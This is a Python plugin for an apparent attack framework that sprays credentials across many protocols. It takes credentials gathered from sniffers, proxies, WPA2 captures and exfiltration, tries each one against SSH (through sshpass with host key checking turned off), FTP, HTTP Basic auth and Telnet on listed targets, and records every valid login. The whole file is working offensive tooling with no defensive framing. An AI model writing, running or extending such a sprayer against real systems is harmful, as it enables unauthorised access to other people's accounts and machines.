from core.plugin_manager import BasePlugin
import asyncio
import ftplib
import socket
import urllib.request
import urllib.error
import base64
import re


class CredSprayPlugin(BasePlugin):
    def __init__(self):
        self.running = False
        self._credential_pool: list[dict] = []   # {"user": ..., "password": ...}
        self._targets: dict[str, list[int]] = {}  # ip → [open ports]
        self.results: list[dict] = []

    @property
    def name(self) -> str:
        return "Cred-Spray"

    @property
    def description(self) -> str:
        return "Multi-Protocol Credential Sprayer"

    async def start(self):
        self.running = True
        print("Cred-Spray: initialized.")

    async def stop(self):
        self.running = False

    # ------------------------------------------------------------------
    # Credential pool management
    # ------------------------------------------------------------------

    def add_credential(self, raw: str):
        """Parse raw credential string into user/password pair and add to pool."""
        parsed = self._parse_cred(raw)
        if parsed and parsed not in self._credential_pool:
            self._credential_pool.append(parsed)

    def add_target(self, ip: str, ports: list[int]):
        existing = self._targets.get(ip, [])
        merged = list(set(existing + ports))
        self._targets[ip] = merged

    @staticmethod
    def _parse_cred(raw: str) -> dict | None:
        raw = raw.strip()
        # Strip common prefixes from sniffer/proxy
        for prefix in ("HTTP-Basic:", "HTTP-Form:", "FTP-USER:", "FTP-PASS:",
                       "SMTP-AUTH:", "IMAP-LOGIN:", "TELNET-USER:", "TELNET-PASS:",
                       "GENERIC-USER:", "GENERIC-PASS:", "WPA2:", "Secret-Hunter:",
                       "Proxy:BasicAuth:", "Proxy:FormPost:", "Sniffer:",
                       "Exfil:"):
            if raw.startswith(prefix):
                raw = raw[len(prefix):]
                break
        # "user:pass" split
        if ":" in raw:
            parts = raw.split(":", 1)
            return {"user": parts[0], "password": parts[1]}
        # Single token — treat as password with common usernames
        return {"user": "admin", "password": raw}

    # ------------------------------------------------------------------
    # Main spray entry points
    # ------------------------------------------------------------------

    async def spray_target(self, ip: str) -> list[dict]:
        """Try all pooled credentials against all known open ports on ip."""
        ports = self._targets.get(ip, [22, 21, 80, 8080])
        hits = []
        for cred in self._credential_pool:
            if not self.running:
                break
            for port in ports:
                result = await self._try_one(ip, port, cred["user"], cred["password"])
                if result:
                    hits.append(result)
                    self.results.append(result)
                    self.emit("CREDENTIAL_VALID", result)
                    if self.target_store:
                        self.target_store.save_credential(
                            "Cred-Spray",
                            f"{cred['user']}:{cred['password']}@{ip}:{port}"
                        )
        return hits

    async def run_spray(self) -> list[dict]:
        """Spray all known targets. Called by pipeline engine after scan+creds are ready."""
        all_hits = []
        for ip in list(self._targets.keys()):
            hits = await self.spray_target(ip)
            all_hits.extend(hits)
        total = len(all_hits)
        self.emit("SPRAY_COMPLETE", {"total_hits": total, "hits": all_hits})
        return all_hits

    async def _try_one(self, ip: str, port: int, user: str, password: str) -> dict | None:
        proto = self._port_to_proto(port)
        try:
            if proto == "SSH":
                success = await asyncio.to_thread(self._try_ssh, ip, port, user, password)
            elif proto == "FTP":
                success = await asyncio.to_thread(self._try_ftp, ip, port, user, password)
            elif proto in ("HTTP", "HTTPS"):
                success = await asyncio.to_thread(self._try_http, ip, port, user, password)
            elif proto == "TELNET":
                success = await asyncio.to_thread(self._try_telnet, ip, port, user, password)
            else:
                return None
            if success:
                return {"ip": ip, "port": port, "proto": proto, "user": user, "password": password}
        except Exception:
            pass
        return None

    @staticmethod
    def _port_to_proto(port: int) -> str:
        mapping = {22: "SSH", 21: "FTP", 23: "TELNET",
                   80: "HTTP", 8080: "HTTP", 8000: "HTTP",
                   443: "HTTPS", 8443: "HTTPS"}
        return mapping.get(port, "UNKNOWN")

    # ------------------------------------------------------------------
    # Protocol-specific testers
    # ------------------------------------------------------------------

    def _try_ssh(self, ip: str, port: int, user: str, password: str) -> bool:
        """Try SSH via subprocess sshpass (requires sshpass installed)."""
        import subprocess, os
        if not self._cmd_exists("sshpass"):
            return False
        result = subprocess.run(
            ["sshpass", "-p", password,
             "ssh", "-o", "StrictHostKeyChecking=no",
             "-o", "ConnectTimeout=3",
             "-o", "BatchMode=no",
             "-p", str(port),
             f"{user}@{ip}", "exit"],
            capture_output=True, timeout=6,
        )
        return result.returncode == 0

    def _try_ftp(self, ip: str, port: int, user: str, password: str) -> bool:
        try:
            ftp = ftplib.FTP()
            ftp.connect(ip, port, timeout=4)
            ftp.login(user, password)
            ftp.quit()
            return True
        except ftplib.error_perm:
            return False
        except Exception:
            return False

    def _try_http(self, ip: str, port: int, user: str, password: str) -> bool:
        scheme = "https" if port in (443, 8443) else "http"
        url = f"{scheme}://{ip}:{port}/"
        credentials = base64.b64encode(f"{user}:{password}".encode()).decode()
        req = urllib.request.Request(url)
        req.add_header("Authorization", f"Basic {credentials}")
        req.add_header("User-Agent", "Mozilla/5.0")
        try:
            resp = urllib.request.urlopen(req, timeout=4)
            return resp.status < 400
        except urllib.error.HTTPError as e:
            return e.code not in (401, 403)
        except Exception:
            return False

    def _try_telnet(self, ip: str, port: int, user: str, password: str) -> bool:
        try:
            sock = socket.create_connection((ip, port), timeout=4)
            banner = sock.recv(1024).decode("utf-8", errors="ignore")
            sock.sendall((user + "\n").encode())
            _ = sock.recv(512)
            sock.sendall((password + "\n").encode())
            response = sock.recv(512).decode("utf-8", errors="ignore")
            sock.close()
            fail_words = ("incorrect", "failed", "invalid", "denied", "error")
            return not any(w in response.lower() for w in fail_words)
        except Exception:
            return False

    @staticmethod
    def _cmd_exists(cmd: str) -> bool:
        import shutil
        return shutil.which(cmd) is not None
